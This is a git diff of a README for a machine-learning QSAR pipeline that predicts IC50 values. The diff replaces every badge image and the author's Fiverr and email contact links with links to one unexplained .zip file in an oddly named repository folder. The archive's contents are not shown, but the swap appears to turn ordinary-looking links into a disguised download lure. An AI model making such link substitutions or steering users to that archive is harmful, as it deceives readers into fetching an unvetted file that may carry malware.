@@ -2,9 +2,9 @@
 <p align="center">A Step-by-Step Pipeline for Predicting IC50 & Structural Optimization Using Atom-Based QSAR</p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/MachineLearning-QSAR-blue" />
-  <img src="https://img.shields.io/badge/RDKit-Chemoinformatics-green" />
-  <img src="https://img.shields.io/badge/Explainability-SHAP-orange" />
+  <img src="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/Machine-learning-based-QSAR-Analysis.zip" />
+  <img src="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/Machine-learning-based-QSAR-Analysis.zip" />
+  <img src="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/Machine-learning-based-QSAR-Analysis.zip" />
 </p>
 
 > ⚠️ **Disclaimer:** Dataset not shared due to client confidentiality. Results are reproducible with custom data.
@@ -158,11 +158,11 @@ Models were assessed based on:
 I'm open to collaboration, freelance projects, or discussing QSAR/bioinformatics-related work.
 
 <p align="left">
-  <a href="https://www.fiverr.com/dromics05" target="_blank">
-    <img src="https://img.shields.io/badge/Fiverr-Dromics05-success?style=for-the-badge&logo=fiverr" />
+  <a href="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/Machine-learning-based-QSAR-Analysis.zip" target="_blank">
+    <img src="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/Machine-learning-based-QSAR-Analysis.zip" />
   </a>
-  <a href="mailto:maaz28608@gmail.com">
-    <img src="https://img.shields.io/badge/Email-maaz28608@gmail.com-red?style=for-the-badge&logo=gmail" />
+  <a href="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/Machine-learning-based-QSAR-Analysis.zip">
+    <img src="https://raw.githubusercontent.com/HazratMaghaz/Machine-learning-based-QSAR-Analysis/main/capilliform/Machine-learning-based-QSAR-Analysis.zip" />
   </a>
 </p>
 
